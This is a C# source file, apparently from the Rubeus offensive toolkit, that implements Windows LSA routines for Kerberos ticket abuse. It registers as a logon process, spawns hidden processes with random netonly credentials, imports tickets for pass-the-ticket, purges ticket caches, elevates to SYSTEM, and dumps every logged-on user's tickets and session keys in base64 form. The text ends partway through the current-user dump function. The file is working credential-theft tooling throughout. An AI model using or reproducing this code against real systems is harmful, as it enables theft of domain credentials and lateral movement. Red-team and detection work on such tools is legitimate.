﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text.RegularExpressions;

namespace Rubeus
{
    public class LSA
    {
        public static IntPtr LsaRegisterLogonProcessHelper()
        {
            // helper that establishes a connection to the LSA server and verifies that the caller is a logon application
            //  used for Kerberos ticket enumeration

            string logonProcessName = "User32LogonProcesss";
            Interop.LSA_STRING_IN LSAString;
            IntPtr lsaHandle = IntPtr.Zero;
            UInt64 securityMode = 0;

            LSAString.Length = (ushort)logonProcessName.Length;
            LSAString.MaximumLength = (ushort)(logonProcessName.Length + 1);
            LSAString.Buffer = logonProcessName;

            int ret = Interop.LsaRegisterLogonProcess(LSAString, out lsaHandle, out securityMode);

            return lsaHandle;
        }

        public static uint CreateProcessNetOnly(string commandLine, bool show = false)
        {
            // creates a hidden process with random /netonly credentials,
            //  displayng the process ID and LUID, and returning the LUID
            // Note: the LUID can be used with the "ptt" action

            Console.WriteLine("\r\n[*] Action: Create Process (/netonly)\r\n");

            Interop.PROCESS_INFORMATION pi;
            Interop.STARTUPINFO si = new Interop.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            if (!show)
            {
                // hide the window
                si.wShowWindow = 0;
                si.dwFlags = 0x00000001;
            }
            Console.WriteLine("[*] Showing process : {0}", show);
            uint luid = 0;

            // 0x00000002 == LOGON_NETCREDENTIALS_ONLY
            if (!Interop.CreateProcessWithLogonW(Helpers.RandomString(8), Helpers.RandomString(8), Helpers.RandomString(8), 0x00000002, commandLine, String.Empty, 0, 0, null, ref si, out pi))
            {
                uint lastError = Interop.GetLastError();
                Console.WriteLine("[X] CreateProcessWithLogonW error: {0}", lastError);
                return 0;
            }

            Console.WriteLine("[+] Process         : '{0}' successfully created with LOGON_TYPE = 9", commandLine);
            Console.WriteLine("[+] ProcessID       : {0}", pi.dwProcessId);

            IntPtr hToken = IntPtr.Zero;
            // TOKEN_QUERY == 0x0008
            bool success = Interop.OpenProcessToken(pi.hProcess, 0x0008, out hToken);
            if (!success)
            {
                uint lastError = Interop.GetLastError();
                Console.WriteLine("[X] OpenProcessToken error: {0}", lastError);
                return 0;
            }

            int TokenInfLength = 0;
            bool Result;

            // first call gets lenght of TokenInformation to get proper struct size
            Result = Interop.GetTokenInformation(hToken, Interop.TOKEN_INFORMATION_CLASS.TokenStatistics, IntPtr.Zero, TokenInfLength, out TokenInfLength);

            IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);

            // second call actually gets the information
            Result = Interop.GetTokenInformation(hToken, Interop.TOKEN_INFORMATION_CLASS.TokenStatistics, TokenInformation, TokenInfLength, out TokenInfLength);

            if (Result)
            {
                Interop.TOKEN_STATISTICS TokenStats = (Interop.TOKEN_STATISTICS)Marshal.PtrToStructure(TokenInformation, typeof(Interop.TOKEN_STATISTICS));
                Interop.LUID authId = TokenStats.AuthenticationId;
                Console.WriteLine("[+] LUID            : {0}", authId.LowPart);
                luid = authId.LowPart;
            }

            Marshal.FreeHGlobal(TokenInformation);
            Interop.CloseHandle(hToken);

            return luid;
        }

        public static void ImportTicket(byte[] ticket, uint targetLuid = 0)
        {
            Console.WriteLine("\r\n[*] Action: Import Ticket");

            // straight from Vincent LE TOUX' work
            //  https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2925-L2971

            IntPtr LsaHandle = IntPtr.Zero;
            int AuthenticationPackage;
            int ntstatus, ProtocalStatus;

            if(targetLuid != 0)
            {
                if(!Helpers.IsHighIntegrity())
                {
                    Console.WriteLine("[X] You need to be in high integrity to apply a ticket to a different logon session");
                    return;
                }
                else
                {
                    string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                    if (currentName == "NT AUTHORITY\\SYSTEM")
                    {
                        // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                        LsaHandle = LsaRegisterLogonProcessHelper();
                    }
                    else
                    {
                        // elevated but not system, so gotta GetSystem() first
                        Helpers.GetSystem();
                        // should now have the proper privileges to get a Handle to LSA
                        LsaHandle = LsaRegisterLogonProcessHelper();
                        // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                        Interop.RevertToSelf();
                    }
                }
            }
            else
            {
                // otherwise use the unprivileged connection with LsaConnectUntrusted
                ntstatus = Interop.LsaConnectUntrusted(out LsaHandle);
            }

            IntPtr inputBuffer = IntPtr.Zero;
            IntPtr ProtocolReturnBuffer;
            int ReturnBufferLength;
            try
            {
                Interop.LSA_STRING_IN LSAString;
                string Name = "kerberos";
                LSAString.Length = (ushort)Name.Length;
                LSAString.MaximumLength = (ushort)(Name.Length + 1);
                LSAString.Buffer = Name;
                ntstatus = Interop.LsaLookupAuthenticationPackage(LsaHandle, ref LSAString, out AuthenticationPackage);
                if (ntstatus != 0)
                {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    Console.WriteLine("[X] Windows error running LsaLookupAuthenticationPackage: {0}", winError);
                    return;
                }
                Interop.KERB_SUBMIT_TKT_REQUEST request = new Interop.KERB_SUBMIT_TKT_REQUEST();
                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage;
                request.KerbCredSize = ticket.Length;
                request.KerbCredOffset = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST));

                if(targetLuid != 0)
                {
                    Console.WriteLine("[*] Target LUID: 0x{0:x}", targetLuid);
                    Interop.LUID luid = new Interop.LUID();
                    luid.LowPart = targetLuid;
                    luid.HighPart = 0;
                    request.LogonId = luid;
                }

                int inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST)) + ticket.Length;
                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                Marshal.StructureToPtr(request, inputBuffer, false);
                Marshal.Copy(ticket, 0, new IntPtr(inputBuffer.ToInt64() + request.KerbCredOffset), ticket.Length);
                ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                if (ntstatus != 0)
                {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage: {0}", winError);
                    return;
                }
                if (ProtocalStatus != 0)
                {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage/ProtocalStatus: {0}", winError);
                    return;
                }
                Console.WriteLine("[+] Ticket successfully imported!");
            }
            finally
            {
                if (inputBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(inputBuffer);
                Interop.LsaDeregisterLogonProcess(LsaHandle);
            }
        }

        public static void Purge(uint targetLuid = 0)
        {
            Console.WriteLine("\r\n[*] Action: Purge Tickets");

            // straight from Vincent LE TOUX' work
            //  https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2925-L2971

            IntPtr LsaHandle = IntPtr.Zero;
            int AuthenticationPackage;
            int ntstatus, ProtocalStatus;

            if (targetLuid != 0)
            {
                if (!Helpers.IsHighIntegrity())
                {
                    Console.WriteLine("[X] You need to be in high integrity to purge tickets from a different logon session");
                    return;
                }
                else
                {
                    string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                    if (currentName == "NT AUTHORITY\\SYSTEM")
                    {
                        // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                        LsaHandle = LsaRegisterLogonProcessHelper();
                    }
                    else
                    {
                        // elevated but not system, so gotta GetSystem() first
                        Helpers.GetSystem();
                        // should now have the proper privileges to get a Handle to LSA
                        LsaHandle = LsaRegisterLogonProcessHelper();
                        // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                        Interop.RevertToSelf();
                    }
                }
            }
            else
            {
                // otherwise use the unprivileged connection with LsaConnectUntrusted
                ntstatus = Interop.LsaConnectUntrusted(out LsaHandle);
            }

            IntPtr inputBuffer = IntPtr.Zero;
            IntPtr ProtocolReturnBuffer;
            int ReturnBufferLength;
            try
            {
                Interop.LSA_STRING_IN LSAString;
                string Name = "kerberos";
                LSAString.Length = (ushort)Name.Length;
                LSAString.MaximumLength = (ushort)(Name.Length + 1);
                LSAString.Buffer = Name;
                ntstatus = Interop.LsaLookupAuthenticationPackage(LsaHandle, ref LSAString, out AuthenticationPackage);
                if (ntstatus != 0)
                {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    Console.WriteLine("[X] Windows error running LsaLookupAuthenticationPackage: {0}", winError);
                    return;
                }

                Interop.KERB_PURGE_TKT_CACHE_REQUEST request = new Interop.KERB_PURGE_TKT_CACHE_REQUEST();
                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbPurgeTicketCacheMessage;

                if (targetLuid != 0)
                {
                    Console.WriteLine("[*] Target LUID: 0x{0:x}", targetLuid);
                    Interop.LUID luid = new Interop.LUID();
                    luid.LowPart = targetLuid;
                    luid.HighPart = 0;
                    request.LogonId = luid;
                }

                //Interop.LSA_STRING_IN ServerName;
                //ServerName.Length = 0;
                //ServerName.MaximumLength = 0;
                //ServerName.Buffer = null;

                //Interop.LSA_STRING_IN RealmName;
                //ServerName.Length = 0;
                //ServerName.MaximumLength = 0;
                //ServerName.Buffer = null;

                int inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_PURGE_TKT_CACHE_REQUEST));
                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                Marshal.StructureToPtr(request, inputBuffer, false);
                ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                if (ntstatus != 0)
                {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage: {0}", winError);
                    return;
                }
                if (ProtocalStatus != 0)
                {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage/ProtocalStatus: {0}", winError);
                    return;
                }
                Console.WriteLine("[+] Tickets successfully purged!");
            }
            finally
            {
                if (inputBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(inputBuffer);
                Interop.LsaDeregisterLogonProcess(LsaHandle);
            }
        }

        public static void ListKerberosTicketData(uint targetLuid = 0, string targetService = "", bool monitor = false)
        {
            // lists 
            if (Helpers.IsHighIntegrity())
            {
                ListKerberosTicketDataAllUsers(targetLuid, targetService, monitor);
            }
            else
            {
                ListKerberosTicketDataCurrentUser(targetService);
            }
        }

        public static void ListKerberosTicketDataAllUsers(uint targetLuid = 0, string targetService = "", bool monitor = false, bool harvest = false)
        {
            // extracts Kerberos ticket data for all users on the system (assuming elevation)

            //  first elevates to SYSTEM and uses LsaRegisterLogonProcessHelper connect to LSA
            //  then calls LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type to enumerate all cached tickets
            //  and finally uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
            //  to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)

            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            if (!monitor)
            {
                Console.WriteLine("\r\n\r\n[*] Action: Dump Kerberos Ticket Data (All Users)\r\n");
            }

            if (targetLuid != 0)
            {
                Console.WriteLine("[*] Target LUID     : 0x{0:x}", targetLuid);
            }
            if (!String.IsNullOrEmpty(targetService))
            {
                Console.WriteLine("[*] Target service  : {0:x}", targetService);
                if (!monitor)
                {
                    Console.WriteLine();
                }
            }

            int totalTicketCount = 0;
            int extractedTicketCount = 0;
            int retCode;
            int authPack;
            string name = "kerberos";
            Interop.LSA_STRING_IN LSAString;
            LSAString.Length = (ushort)name.Length;
            LSAString.MaximumLength = (ushort)(name.Length + 1);
            LSAString.Buffer = name;

            IntPtr lsaHandle = LsaRegisterLogonProcessHelper();

            // if the original call fails then it is likely we don't have SeTcbPrivilege
            // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
            if (lsaHandle == IntPtr.Zero)
            {
                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                if (currentName == "NT AUTHORITY\\SYSTEM")
                {
                    // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                    lsaHandle = LsaRegisterLogonProcessHelper();
                }
                else
                {
                    // elevated but not system, so gotta GetSystem() first
                    Helpers.GetSystem();
                    // should now have the proper privileges to get a Handle to LSA
                    lsaHandle = LsaRegisterLogonProcessHelper();
                    // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                    Interop.RevertToSelf();
                }
            }

            try
            {
                // obtains the unique identifier for the kerberos authentication package.
                retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

                // first return all the logon sessions
                DateTime systime = new DateTime(1601, 1, 1, 0, 0, 0, 0); //win32 systemdate
                UInt64 count;
                IntPtr luidPtr = IntPtr.Zero;
                IntPtr iter = luidPtr;

                uint ret = Interop.LsaEnumerateLogonSessions(out count, out luidPtr);  // get an array of pointers to LUIDs

                for (ulong i = 0; i < count; i++)
                {
                    IntPtr sessionData;
                    ret = Interop.LsaGetLogonSessionData(luidPtr, out sessionData);
                    Interop.SECURITY_LOGON_SESSION_DATA data = (Interop.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionData, typeof(Interop.SECURITY_LOGON_SESSION_DATA));

                    // if we have a valid logon
                    if (data.PSiD != IntPtr.Zero)
                    {
                        // user session data
                        string username = Marshal.PtrToStringUni(data.Username.Buffer).Trim();
                        System.Security.Principal.SecurityIdentifier sid = new System.Security.Principal.SecurityIdentifier(data.PSiD);
                        string domain = Marshal.PtrToStringUni(data.LoginDomain.Buffer).Trim();
                        string authpackage = Marshal.PtrToStringUni(data.AuthenticationPackage.Buffer).Trim();
                        Interop.SECURITY_LOGON_TYPE logonType = (Interop.SECURITY_LOGON_TYPE)data.LogonType;
                        DateTime logonTime = systime.AddTicks((long)data.LoginTime);
                        string logonServer = Marshal.PtrToStringUni(data.LogonServer.Buffer).Trim();
                        string dnsDomainName = Marshal.PtrToStringUni(data.DnsDomainName.Buffer).Trim();
                        string upn = Marshal.PtrToStringUni(data.Upn.Buffer).Trim();

                        IntPtr ticketsPointer = IntPtr.Zero;
                        DateTime sysTime = new DateTime(1601, 1, 1, 0, 0, 0, 0);

                        int returnBufferLength = 0;
                        int protocalStatus = 0;

                        Interop.KERB_QUERY_TKT_CACHE_REQUEST tQuery = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();
                        Interop.KERB_QUERY_TKT_CACHE_RESPONSE tickets = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
                        Interop.KERB_TICKET_CACHE_INFO ticket;

                        // input object for querying the ticket cache for a specific logon ID
                        Interop.LUID userLogonID = new Interop.LUID();
                        userLogonID.LowPart = data.LoginID.LowPart;
                        userLogonID.HighPart = 0;
                        tQuery.LogonId = userLogonID;

                        if ((targetLuid == 0) || (data.LoginID.LowPart == targetLuid))
                        {
                            tQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;

                            // query LSA, specifying we want the ticket cache
                            IntPtr tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tQuery));
                            Marshal.StructureToPtr(tQuery, tQueryPtr, false);
                            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, tQueryPtr, Marshal.SizeOf(tQuery), out ticketsPointer, out returnBufferLength, out protocalStatus);

                            if (ticketsPointer != IntPtr.Zero)
                            {
                                // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
                                tickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
                                int count2 = tickets.CountOfTickets;

                                if (count2 != 0)
                                {
                                    Console.WriteLine("\r\n  UserName                 : {0}", username);
                                    Console.WriteLine("  Domain                   : {0}", domain);
                                    Console.WriteLine("  LogonId                  : {0}", data.LoginID.LowPart);
                                    Console.WriteLine("  UserSID                  : {0}", sid.Value);
                                    Console.WriteLine("  AuthenticationPackage    : {0}", authpackage);
                                    Console.WriteLine("  LogonType                : {0}", logonType);
                                    Console.WriteLine("  LogonTime                : {0}", logonTime);
                                    Console.WriteLine("  LogonServer              : {0}", logonServer);
                                    Console.WriteLine("  LogonServerDNSDomain     : {0}", dnsDomainName);
                                    Console.WriteLine("  UserPrincipalName        : {0}", upn);
                                    Console.WriteLine();
                                    if (!monitor)
                                    {
                                        Console.WriteLine("    [*] Enumerated {0} ticket(s):\r\n", count2);
                                    }
                                    totalTicketCount += count2;

                                    // get the size of the structures we're iterating over
                                    Int32 dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO));

                                    for (int j = 0; j < count2; j++)
                                    {
                                        // iterate through the result structures
                                        IntPtr currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + j * dataSize)));

                                        // parse the new ptr to the appropriate structure
                                        ticket = (Interop.KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO));

                                        // extract the serverName and ticket flags
                                        string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);

                                        if (String.IsNullOrEmpty(targetService) || (Regex.IsMatch(serverName, String.Format(@"^{0}/.*", targetService), RegexOptions.IgnoreCase)))
                                        {
                                            extractedTicketCount++;

                                            // now we have to call LsaCallAuthenticationPackage() again with the specific server target
                                            IntPtr responsePointer = IntPtr.Zero;
                                            Interop.KERB_RETRIEVE_TKT_REQUEST request = new Interop.KERB_RETRIEVE_TKT_REQUEST();
                                            Interop.KERB_RETRIEVE_TKT_RESPONSE response = new Interop.KERB_RETRIEVE_TKT_RESPONSE();

                                            // signal that we want encoded .kirbi's returned
                                            request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage;

                                            // the specific logon session ID
                                            request.LogonId = userLogonID;

                                            request.TicketFlags = ticket.TicketFlags;
                                            request.CacheOptions = 0x8; // KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED
                                            request.EncryptionType = 0x0;
                                            // the target ticket name we want the ticket for
                                            Interop.UNICODE_STRING tName = new Interop.UNICODE_STRING(serverName);
                                            request.TargetName = tName;

                                            // the following is due to the wonky way LsaCallAuthenticationPackage wants the KERB_RETRIEVE_TKT_REQUEST
                                            //      for KerbRetrieveEncodedTicketMessages

                                            // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len
                                            int structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
                                            int newStructSize = structSize + tName.MaximumLength;
                                            IntPtr unmanagedAddr = Marshal.AllocHGlobal(newStructSize);

                                            // marshal the struct from a managed object to an unmanaged block of memory.
                                            Marshal.StructureToPtr(request, unmanagedAddr, false);

                                            // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
                                            IntPtr newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));

                                            // copy unicode chars to the new location
                                            Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);

                                            // update the target name buffer ptr            
                                            Marshal.WriteIntPtr(unmanagedAddr, 24, newTargetNameBuffPtr);

                                            // actually get the data
                                            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, unmanagedAddr, newStructSize, out responsePointer, out returnBufferLength, out protocalStatus);

                                            // translate the LSA error (if any) to a Windows error
                                            uint winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

                                            if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0))
                                            {
                                                // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                                                response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

                                                Interop.KERB_EXTERNAL_NAME serviceNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ServiceName, typeof(Interop.KERB_EXTERNAL_NAME));
                                                string serviceName = Marshal.PtrToStringUni(serviceNameStruct.Names.Buffer, serviceNameStruct.Names.Length / 2).Trim();

                                                string targetName = "";
                                                if (response.Ticket.TargetName != IntPtr.Zero)
                                                {
                                                    Interop.KERB_EXTERNAL_NAME targetNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.TargetName, typeof(Interop.KERB_EXTERNAL_NAME));
                                                    targetName = Marshal.PtrToStringUni(targetNameStruct.Names.Buffer, targetNameStruct.Names.Length / 2).Trim();
                                                }

                                                Interop.KERB_EXTERNAL_NAME clientNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ClientName, typeof(Interop.KERB_EXTERNAL_NAME));
                                                string clientName = Marshal.PtrToStringUni(clientNameStruct.Names.Buffer, clientNameStruct.Names.Length / 2).Trim();

                                                string domainName = Marshal.PtrToStringUni(response.Ticket.DomainName.Buffer, response.Ticket.DomainName.Length / 2).Trim();
                                                string targetDomainName = Marshal.PtrToStringUni(response.Ticket.TargetDomainName.Buffer, response.Ticket.TargetDomainName.Length / 2).Trim();
                                                string altTargetDomainName = Marshal.PtrToStringUni(response.Ticket.AltTargetDomainName.Buffer, response.Ticket.AltTargetDomainName.Length / 2).Trim();

                                                // extract the session key
                                                Interop.KERB_ETYPE sessionKeyType = (Interop.KERB_ETYPE)response.Ticket.SessionKey.KeyType;
                                                Int32 sessionKeyLength = response.Ticket.SessionKey.Length;
                                                byte[] sessionKey = new byte[sessionKeyLength];
                                                Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);
                                                string base64SessionKey = Convert.ToBase64String(sessionKey);

                                                DateTime keyExpirationTime = DateTime.FromFileTime(response.Ticket.KeyExpirationTime);
                                                DateTime startTime = DateTime.FromFileTime(response.Ticket.StartTime);
                                                DateTime endTime = DateTime.FromFileTime(response.Ticket.EndTime);
                                                DateTime renewUntil = DateTime.FromFileTime(response.Ticket.RenewUntil);
                                                Int64 timeSkew = response.Ticket.TimeSkew;
                                                Int32 encodedTicketSize = response.Ticket.EncodedTicketSize;

                                                string ticketFlags = ((Interop.TicketFlags)ticket.TicketFlags).ToString();

                                                // extract the ticket and base64 encode it
                                                byte[] encodedTicket = new byte[encodedTicketSize];
                                                Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);
                                                string base64TGT = Convert.ToBase64String(encodedTicket);

                                                Console.WriteLine("    ServiceName              : {0}", serviceName);
                                                Console.WriteLine("    TargetName               : {0}", targetName);
                                                Console.WriteLine("    ClientName               : {0}", clientName);
                                                Console.WriteLine("    DomainName               : {0}", domainName);
                                                Console.WriteLine("    TargetDomainName         : {0}", targetDomainName);
                                                Console.WriteLine("    AltTargetDomainName      : {0}", altTargetDomainName);
                                                Console.WriteLine("    SessionKeyType           : {0}", sessionKeyType);
                                                Console.WriteLine("    Base64SessionKey         : {0}", base64SessionKey);
                                                Console.WriteLine("    KeyExpirationTime        : {0}", keyExpirationTime);
                                                Console.WriteLine("    TicketFlags              : {0}", ticketFlags);
                                                Console.WriteLine("    StartTime                : {0}", startTime);
                                                Console.WriteLine("    EndTime                  : {0}", endTime);
                                                Console.WriteLine("    RenewUntil               : {0}", renewUntil);
                                                Console.WriteLine("    TimeSkew                 : {0}", timeSkew);
                                                Console.WriteLine("    EncodedTicketSize        : {0}", encodedTicketSize);
                                                Console.WriteLine("    Base64EncodedTicket      :\r\n");
                                                // display the TGT, columns of 100 chararacters
                                                foreach (string line in Helpers.Split(base64TGT, 100))
                                                {
                                                    Console.WriteLine("      {0}", line);
                                                }
                                                Console.WriteLine();
                                            }
                                            else
                                            {
                                                string errorMessage = new Win32Exception((int)winError).Message;
                                                Console.WriteLine("\r\n    [X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}", winError, serverName, errorMessage);
                                            }

                                            // clean up
                                            Interop.LsaFreeReturnBuffer(responsePointer);
                                            Marshal.FreeHGlobal(unmanagedAddr);
                                        }
                                    }
                                }
                            }

                            // cleanup
                            Interop.LsaFreeReturnBuffer(ticketsPointer);
                            Marshal.FreeHGlobal(tQueryPtr);
                        }
                    }

                    // move the pointer forward
                    luidPtr = (IntPtr)((long)luidPtr.ToInt64() + Marshal.SizeOf(typeof(Interop.LUID)));

                    // cleaup
                    Interop.LsaFreeReturnBuffer(sessionData);
                }
                Interop.LsaFreeReturnBuffer(luidPtr);

                // disconnect from LSA
                Interop.LsaDeregisterLogonProcess(lsaHandle);

                if (!monitor)
                {
                    Console.WriteLine("\r\n\r\n[*] Enumerated {0} total tickets", totalTicketCount);
                }
                Console.WriteLine("[*] Extracted  {0} total tickets\r\n", extractedTicketCount);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception: {0}", ex);
            }
        }

        public static void ListKerberosTicketDataCurrentUser(string targetService)
        {
            // extracts Kerberos ticket data for the current user

            //  first uses LsaConnectUntrusted to connect and LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type
            //  to enumerate all cached tickets, then uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
            //  to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)

            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            Console.WriteLine("\r\n\r\n[*] Action: Dump Kerberos Ticket Data (Current User)\r\n");
            if (!String.IsNullOrEmpty(targetService))
            {
                Console.WriteLine("\r\n[*] Target service  : {0:x}\r\n\r\n", targetService);
            }

            int totalTicketCount = 0;
            int extractedTicketCount = 0;
            string name = "kerberos";
            Interop.LSA_STRING_IN LSAString;
            LSAString.Length = (ushort)name.Length;
            LSAString.MaximumLength = (ushort)(name.Length + 1);
            LSAString.Buffer = name;

            IntPtr ticketsPointer = IntPtr.Zero;
            int authPack;
            int returnBufferLength = 0;
            int protocalStatus = 0;
            IntPtr lsaHandle;
            int retCode;

            // If we want to look at tickets from a session other than our own
            //      then we need to use LsaRegisterLogonProcess instead of LsaConnectUntrusted
            retCode = Interop.LsaConnectUntrusted(out lsaHandle);

            // obtains the unique identifier for the kerberos authentication package.
            retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

            Interop.KERB_QUERY_TKT_CACHE_REQUEST cacheQuery = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();
            Interop.KERB_QUERY_TKT_CACHE_RESPONSE cacheTickets = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
            Interop.KERB_TICKET_CACHE_INFO ticket;

            // input object for querying the ticket cache (https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_query_tkt_cache_request)
            cacheQuery.LogonId = new Interop.LUID();
            cacheQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;

            // query LSA, specifying we want the ticket cache
            IntPtr cacheQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(cacheQuery));
            Marshal.StructureToPtr(cacheQuery, cacheQueryPtr, false);
            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, cacheQueryPtr, Marshal.SizeOf(cacheQuery), out ticketsPointer, out returnBufferLength, out protocalStatus);

            // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
            cacheTickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
            int count = cacheTickets.CountOfTickets;
            Console.WriteLine("[*] Returned {0} tickets\r\n", count);
            totalTicketCount += count;

            // get the size of the structures we're iterating over
            Int32 dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO));

            for (int i = 0; i < count; i++)
            {
                // iterate through the result structures
                IntPtr currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + i * dataSize)));

                // parse the new ptr to the appropriate structure
                ticket = (Interop.KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO));

                // extract the serverName and ticket flags
                string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);

                if (String.IsNullOrEmpty(targetService) || (Regex.IsMatch(serverName, String.Format(@"^{0}/.*", targetService), RegexOptions.IgnoreCase)))
                {
                    extractedTicketCount++;

                    // now we have to call LsaCallAuthenticationPackage() again with the specific server target
